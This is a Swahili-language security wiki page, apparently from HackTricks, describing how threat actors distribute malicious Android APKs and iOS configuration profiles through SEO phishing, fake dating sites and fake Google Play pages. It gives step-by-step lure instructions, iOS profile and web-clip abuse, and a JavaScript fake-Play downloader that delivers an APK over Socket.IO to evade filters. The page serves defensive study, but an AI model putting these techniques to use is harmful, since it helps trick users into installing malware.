# Hadaa ya Simu za Mkononi na Usambazaji wa Programu Hasidi (Android na iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unaeleza mbinu zinazotumiwa na wahusika tishio kusambaza **Android APKs hasidi** na **iOS mobile-configuration profiles** kupitia hadaa (SEO, uhandisi wa kijamii, maduka bandia, programu za uchumba, n.k.).
> Nyenzo hii imechukuliwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na tafiti nyingine za umma.<sup>[[1]](#references)</sup>

## Mlolongo wa Mashambulizi

1. **Miundombinu ya SEO/Hadaa**
   * Sajili vikoa vingi vinavyofanana na halisi (uchumba, kushiriki faili kwenye cloud, huduma za magari…).
     – Tumia maneno muhimu ya lugha ya eneo na emoji kwenye kipengele cha `<title>` ili kupata nafasi nzuri kwenye Google.
     – Weka *maelekezo ya usakinishaji* wa Android (`.apk`) na iOS kwenye ukurasa mmoja wa kutua.
2. **Upakuaji wa Hatua ya Kwanza**
   * Android: kiungo cha moja kwa moja cha APK *isiyotiwa saini* au APK kutoka “duka la wahusika wengine”.
   * iOS: kiungo cha `itms-services://` au HTTPS cha moja kwa moja cha wasifu hasidi wa **mobileconfig** (tazama hapa chini).
3. **Tabia ya Android Baada ya Kusakinishwa**
   * Utekelezaji unaodhibitiwa na C2, matumizi mabaya ya ruhusa, mbinu za kukwepa vizuizi vya dropper, ukusanyaji wa data chinichini, na tabia nyingine za malware baada ya kusakinishwa zimeelezwa katika ukurasa maalum wa Android Malware Post-Exploitation hapa chini.
4. **Mbinu ya Usambazaji wa iOS**
   * **Wasifu mmoja wa usanidi wa simu** unaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kusajili kifaa kwenye usimamizi wa aina ya “MDM”.
   * Maelekezo ya uhandisi wa kijamii:
     1. Fungua Settings ➜ *Wasifu umepakuliwa*.
     2. Gusa *Sakinisha* mara tatu (picha za skrini kwenye ukurasa wa hadaa).
     3. Amini wasifu ambao haujasainiwa ➜ mshambuliaji anapata haki za *Contacts* na *Photo* bila ukaguzi wa App Store.
5. **Mzigo wa Web Clip wa iOS (ikoni ya programu ya hadaa)**
   * Mizigo ya `com.apple.webClip.managed` inaweza **kubandika URL ya hadaa kwenye Home Screen** ikiwa na ikoni/jina la chapa.
   * Web Clips zinaweza kuendeshwa **katika skrini nzima** (huficha kiolesura cha kivinjari) na kuwekwa kuwa **zisizoweza kuondolewa**, na kumlazimisha mwathiriwa kufuta wasifu ili kuondoa ikoni.<sup>[[3]](#references)</sup>
6. **Tabaka la Mtandao**
   * HTTP isiyosimbwa kwa njia fiche, mara nyingi kwenye port 80 ikiwa na kichwa cha HOST kama `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → ni rahisi kugundua).

## Android Malware Post-Exploitation

Kwa mbinu za Android malware baada ya kusakinishwa, kama vile C2, matumizi mabaya ya Accessibility, overlays, otomatiki ya ATS, upakiaji wa DEX kwa hatua, SMS za malipo ya juu, na persistence, tazama:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Usafirishaji Haramu wa APK kwa Kutumia Socket.IO/WebSocket + Kurasa Bandia za Google Play

Washambuliaji wanazidi kubadilisha viungo tuli vya APK na kutumia chaneli ya Socket.IO/WebSocket iliyopachikwa kwenye vishawishi vinavyofanana na Google Play. Hii huficha URL ya payload, hukwepa vichujio vya URL/viendelezi, na kudumisha hali halisi ya usakinishaji.<sup>[[2]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida wa mteja ulioonekana katika matukio halisi:

<details>
<summary>Kipakua bandia cha Play kinachotumia Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Kwa nini inakwepa vidhibiti rahisi:
- Hakuna URL tuli ya APK inayoonyeshwa; payload huundwa upya kwenye memory kutoka kwa fremu za WebSocket.
- Vichujio vya URL/MIME/extension vinavyozuia majibu ya moja kwa moja ya .apk huenda vikakosa data ya binary inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.

Tazama pia WebSocket tradecraft na tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Upande wa Giza wa Mapenzi: Kampeni ya Uporaji ya SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Mipangilio ya Web Clips payload kwa vifaa vya Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Inayolenga Watumiaji wa Android nchini Indonesia na Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
